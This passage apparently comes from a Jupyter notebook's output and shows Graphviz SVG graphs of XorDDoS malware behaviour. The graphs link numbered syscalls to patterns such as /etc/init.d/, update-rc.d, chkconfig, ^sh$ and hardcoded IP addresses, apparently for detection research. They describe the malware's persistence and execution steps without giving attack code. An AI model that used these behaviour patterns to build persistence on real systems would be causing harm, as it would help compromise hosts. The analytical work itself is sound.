class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.11,-262.04C2744.77,-258.82 2877.46,-250.44 2922.54,-229 2934.66,-223.23 2945.56,-213.27 2954.05,-203.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2956.85,-205.85 2960.6,-195.95 2951.49,-201.35 2956.85,-205.85\"/>\n<text text-anchor=\"middle\" x=\"2966.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.open</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3258.54\" cy=\"-178\" rx=\"53.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3258.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^systemctl$</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge43\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.33,-262.31C2742.4,-259.37 2878.41,-251.26 2993.54,-229 3015.9,-224.68 3020.36,-219.17 3042.54,-214 3094.95,-201.79 3155.49,-192.38 3199.11,-186.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3199.83,-189.84 3209.27,-185.03 3198.89,-182.9 3199.83,-189.84\"/>\n<text text-anchor=\"middle\" x=\"3082.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">71.getsockopt</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge44\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.89,-263.8C2788.14,-262.66 3038.97,-256.82 3122.54,-229 3134.12,-225.15 3134.49,-219.19 3145.54,-214 3164.86,-204.92 3187.12,-197.45 3206.75,-191.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3207.76,-195.12 3216.44,-189.05 3205.87,-188.38 3207.76,-195.12\"/>\n<text text-anchor=\"middle\" x=\"3191.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">73.getsockname</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge45\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.98,-264.35C2822.95,-264.45 3190.15,-261.07 3236.54,-229 3244.36,-223.59 3249.43,-214.75 3252.7,-205.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3256.08,-206.92 3255.69,-196.33 3249.39,-204.85 3256.08,-206.92\"/>\n<text text-anchor=\"middle\" x=\"3289.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">72.setsockopt</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge46\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.62,-263.23C2846.39,-261 3309.58,-253.06 3332.54,-229 3345.87,-215.03 3328.71,-202.82 3307.57,-193.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3308.6,-190.6 3298.01,-190.25 3306.07,-197.13 3308.6,-190.6\"/>\n<text text-anchor=\"middle\" x=\"3361.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.wait4</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge47\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.91,-263.5C2856.89,-261.84 3363.6,-255.05 3388.54,-229 3413.57,-202.86 3364.89,-190.19 3320.14,-184.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3320.44,-180.69 3310.08,-182.93 3319.57,-187.64 3320.44,-180.69\"/>\n<text text-anchor=\"middle\" x=\"3417.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.exec</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3529.54\" cy=\"-178\" rx=\"38.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3529.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/selinux</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge48\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.68,-262.96C2856.79,-260 3368.6,-250.35 3442.54,-229 3463.86,-222.84 3485.51,-210.43 3501.88,-199.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3504.14,-202.2 3510.39,-193.65 3500.17,-196.44 3504.14,-202.2\"/>\n<text text-anchor=\"middle\" x=\"3502.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.statfs</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge49\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2660.06,-264.03C2881.1,-263.74 3500.52,-260.15 3530.54,-229 3536.36,-222.96 3537.65,-214.34 3536.99,-205.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3540.44,-205.37 3535.39,-196.05 3533.53,-206.48 3540.44,-205.37\"/>\n<text text-anchor=\"middle\" x=\"3565.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.access</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3637.54\" cy=\"-91\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3637.54\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/insserv</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge50\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2660.05,-263.78C2890.82,-262.79 3559.65,-257.47 3596.54,-229 3629.91,-203.24 3637.05,-151.38 3638.08,-119.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3641.58,-119.4 3638.22,-109.35 3634.58,-119.3 3641.58,-119.4\"/>\n<text text-anchor=\"middle\" x=\"3652.04\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.stat</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3739.54\" cy=\"-178\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3739.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge51\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.91,-263.86C2889.25,-263.12 3555.22,-258.42 3648.54,-229 3660.18,-225.33 3660.99,-220.13 3671.54,-214 3681.47,-208.23 3692.45,-202.36 3702.65,-197.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3704.4,-200.15 3711.73,-192.5 3701.23,-193.91 3704.4,-200.15\"/>\n<text text-anchor=\"middle\" x=\"3694.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.lseek</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge52\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.76,-263.87C2908.28,-263.15 3673.77,-258.53 3717.54,-229 3725.42,-223.68 3730.5,-214.86 3733.77,-206.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3737.15,-207 3736.74,-196.41 3730.46,-204.94 3737.15,-207\"/>\n<text text-anchor=\"middle\" x=\"3753.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge53\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.71,-263.18C2921.55,-260.21 3760.97,-249.15 3780.54,-229 3789.35,-219.93 3782.47,-209.16 3772,-199.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3773.93,-197 3763.91,-193.55 3769.58,-202.5 3773.93,-197\"/>\n<text text-anchor=\"middle\" x=\"3808.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">15.write</text>\n</g>\n<!-- 15 -->\n<g id=\"node16\" class=\"node\">\n<title>15</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3912.54\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3912.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge54\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2660,-264.24C2915.68,-264.71 3722.85,-263.43 3834.54,-229 3854.46,-222.86 3874.19,-210.13 3888.83,-199.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3891.11,-201.7 3896.82,-192.78 3886.79,-196.2 3891.11,-201.7\"/>\n<text text-anchor=\"middle\" x=\"3891.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">23.clone</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge55\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.74,-263.42C2941.26,-261.13 3897.44,-251.69 3919.54,-229 3925.61,-222.77 3925.92,-213.86 3924.03,-205.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3927.32,-204.07 3921.01,-195.55 3920.63,-206.14 3927.32,-204.07\"/>\n<text text-anchor=\"middle\" x=\"3954.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">24.waitpid</text>\n</g>\n<!-- 16 -->\n<g id=\"node17\" class=\"node\">\n<title>16</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4134.54\" cy=\"-178\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4134.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge56\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.94,-263.51C2935.19,-261.55 3857.18,-253.26 3987.54,-229 4007.03,-225.37 4010.8,-220.47 4029.54,-214 4050.42,-206.79 4073.72,-199 4093.06,-192.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4094.38,-195.85 4102.78,-189.39 4092.18,-189.2 4094.38,-195.85\"/>\n<text text-anchor=\"middle\" x=\"4052.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge57\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.87,-263.62C2956.57,-261.96 4008.97,-254.3 4075.54,-229 4083.54,-225.96 4098.21,-213.54 4110.92,-201.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4113.6,-204.13 4118.51,-194.74 4108.81,-199.02 4113.6,-204.13\"/>\n<text text-anchor=\"middle\" x=\"4123.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge58\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.87,-263.73C2971.94,-262.45 4123.23,-255.9 4149.54,-229 4155.96,-222.43 4154.95,-213.23 4151.38,-204.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4154.39,-202.7 4146.74,-195.38 4148.15,-205.88 4154.39,-202.7\"/>\n<text text-anchor=\"middle\" x=\"4177.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge59\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.86,-263.79C2978.86,-262.73 4177.22,-256.91 4204.54,-229 4218.43,-214.8 4199,-201.86 4177.11,-192.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4178.26,-189.4 4167.67,-189.02 4175.71,-195.92 4178.26,-189.4\"/>\n<text text-anchor=\"middle\" x=\"4231.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">60.write</text>\n</g>\n<!-- 17 -->\n<g id=\"node18\" class=\"node\">\n<title>17</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4385.54\" cy=\"-178\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4385.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge60\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.85,-263.98C2968.07,-263.66 4100.07,-260.37 4257.54,-229 4288.21,-222.89 4321.04,-209.92 4345.77,-198.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4347.56,-201.76 4355.16,-194.38 4344.62,-195.4 4347.56,-201.76\"/>\n<text text-anchor=\"middle\" x=\"4334.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge61\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.91,-263.61C2997.66,-261.76 4327.6,-252.96 4363.54,-229 4371.45,-223.73 4376.54,-214.91 4379.8,-206.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4383.19,-207.04 4382.77,-196.45 4376.5,-204.99 4383.19,-207.04\"/>\n<text text-anchor=\"middle\" x=\"4404.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.shmget</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge62\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.89,-264.01C3007.07,-263.85 4405.93,-261.21 4437.54,-229 4447.18,-219.17 4438.96,-208.57 4426.43,-199.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4428.03,-196.53 4417.72,-194.08 4424.25,-202.42 4428.03,-196.53\"/>\n<text text-anchor=\"middle\" x=\"4477.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.exit_group</text>\n</g>\n<!-- 18 -->\n<g id=\"node19\" class=\"node\">\n<title>18</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4552.54\" cy=\"-18\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4552.54\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/openrc</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge63\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.77,-263.94C3015.52,-263.48 4480.73,-259.75 4516.54,-229 4569.28,-183.71 4563.99,-91.74 4557.44,-46.04\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4560.87,-45.33 4555.87,-35.99 4553.96,-46.41 4560.87,-45.33\"/>\n<text text-anchor=\"middle\" x=\"4578.04\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.stat</text>\n</g>\n<!-- 19 -->\n<g id=\"node20\" class=\"node\">\n<title>19</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4612.54\" cy=\"-178\" rx=\"31.7\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4612.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sed$</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge64\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.92,-264.27C3014.99,-265.31 4474.78,-267.22 4563.54,-229 4576.1,-223.59 4587.08,-213.28 4595.45,-203.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4598.37,-205.37 4601.84,-195.36 4592.88,-201.02 4598.37,-205.37\"/>\n<text text-anchor=\"middle\" x=\"4606.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.exec</text>\n</g>\n<!-- 20 -->\n<g id=\"node21\" class=\"node\">\n<title>20</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4714.54\" cy=\"-178\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4714.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge65\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.91,-263.88C3021.78,-263.14 4533.86,-258.34 4629.54,-229 4641.21,-225.42 4642.11,-220.34 4652.54,-214 4662.23,-208.12 4672.93,-201.96 4682.67,-196.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4684.64,-199.39 4691.66,-191.46 4681.23,-193.27 4684.64,-199.39\"/>\n<text text-anchor=\"middle\" x=\"4672.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">32.lstat</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge66\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.97,-263.85C3035.32,-263 4649.4,-257.66 4692.54,-229 4700.57,-223.66 4705.7,-214.67 4708.95,-205.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4712.37,-206.55 4711.89,-195.97 4705.67,-204.54 4712.37,-206.55\"/>\n<text text-anchor=\"middle\" x=\"4727.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.write</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge67\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.94,-264.23C3042.67,-265.16 4716.08,-267.07 4753.54,-229 4762.76,-219.63 4754.89,-208.12 4743.87,-198.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4745.92,-195.66 4735.9,-192.2 4741.57,-201.15 4745.92,-195.66\"/>\n<text text-anchor=\"middle\" x=\"4774.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.rm</text>\n</g>\n<!-- 21 -->\n<g id=\"node22\" class=\"node\">\n<title>21</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4777.54\" cy=\"-91\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4777.54\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^pipe($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge68\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2660.11,-264.25C3047.59,-265.32 4756.32,-267.82 4794.54,-229 4802.11,-221.31 4790.62,-156.66 4783.14,-118.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4786.56,-118.25 4781.15,-109.14 4779.7,-119.63 4786.56,-118.25\"/>\n<text text-anchor=\"middle\" x=\"4816.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.pipe</text>\n</g>\n<!-- 22 -->\n<g id=\"node23\" class=\"node\">\n<title>22</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4855.54\" cy=\"-18\" rx=\"29.5\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4855.54\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/perl/</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge69\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.86,-263.59C3047.11,-261.45 4759.19,-250.78 4809.54,-229 4875.44,-200.49 4868.27,-96.23 4860.64,-46.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4864.05,-45.39 4858.98,-36.09 4857.15,-46.52 4864.05,-45.39\"/>\n<text text-anchor=\"middle\" x=\"4883.04\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.stat</text>\n</g>\n<!-- 23 -->\n<g id=\"node24\" class=\"node\">\n<title>23</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4920.54\" cy=\"-178\" rx=\"37.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4920.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/sed</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge70\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.65,-263.6C3052.78,-261.48 4817.45,-250.74 4869.54,-229 4882.54,-223.57 4894.05,-213.11 4902.83,-203.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4905.58,-205.32 4909.26,-195.39 4900.19,-200.86 4905.58,-205.32\"/>\n<text text-anchor=\"middle\" x=\"4910.04\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">37.stat</text>\n</g>\n<!-- 24 -->\n<g id=\"node25\" class=\"node\">\n<title>24</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4989.54\" cy=\"-91\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4989.54\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;24 -->\n<g id=\"edge71\" class=\"edge\">\n<title>Start&#45;&gt;24</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.78,-263.63C3059.73,-261.61 4878.86,-251.23 4932.54,-229 4974.1,-211.79 4985.48,-154.32 4988.52,-119.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4992.04,-119.32 4989.24,-109.1 4985.06,-118.83 4992.04,-119.32\"/>\n<text text-anchor=\"middle\" x=\"5004.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n<!-- 25 -->\n<g id=\"node26\" class=\"node\">\n<title>25</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5072.54\" cy=\"-18\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5072.54\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- Start&#45;&gt;25 -->\n<g id=\"edge72\" class=\"edge\">\n<title>Start&#45;&gt;25</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2660,-263.71C3056.19,-262.14 4841.95,-253.69 4956.54,-229 4992.54,-221.24 5008.84,-224.19 5032.54,-196 5068.61,-153.09 5073.86,-84.32 5073.71,-46.37\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5077.21,-46.02 5073.53,-36.08 5070.21,-46.14 5077.21,-46.02\"/>\n<text text-anchor=\"middle\" x=\"5087.54\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.clone</text>\n</g>\n<!-- 26 -->\n<g id=\"node27\" class=\"node\">\n<title>26</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5201.54\" cy=\"-178\" rx=\"100.98\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5201.54\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">permission(s|:)[0&#45;9]{1,4}</text>\n</g>\n<!-- Start&#45;&gt;26 -->\n<g id=\"edge73\" class=\"edge\">\n<title>Start&#45;&gt;26</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2659.82,-263.78C3068.65,-262.49 4965.24,-255.11 5086.54,-229 5113.54,-223.19 5142.03,-210.85 5163.89,-199.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5165.54,-202.98 5172.83,-195.3 5162.34,-196.76 5165.54,-202.98\"/>\n<text text-anchor=\"middle\" x=\"5158.54\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.umask</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.sources.Source at 0x169caaa6c80>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"588pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 587.79 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 583.79,-127 583.79,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"83\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"83\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"39\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"39\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.52,-87.73C51.39,-82.52 45.58,-76.2 42,-69 38.53,-62.04 37.12,-53.85 36.75,-46.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"40.25,-46.08 36.8,-36.06 33.25,-46.04 40.25,-46.08\"/>\n<text text-anchor=\"middle\" x=\"74\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.hardcode</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"128\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"128\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M95.05,-86.91C98.76,-81.32 102.73,-75 106,-69 110.07,-61.5 114,-53.1 117.38,-45.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"120.67,-46.57 121.34,-36 114.22,-43.84 120.67,-46.57\"/>\n<text text-anchor=\"middle\" x=\"137.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"225\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"225\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"337\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"337\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"448\" cy=\"-105\" rx=\"46.29\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"448\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">UID($|.|$)</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"546\" cy=\"-105\" 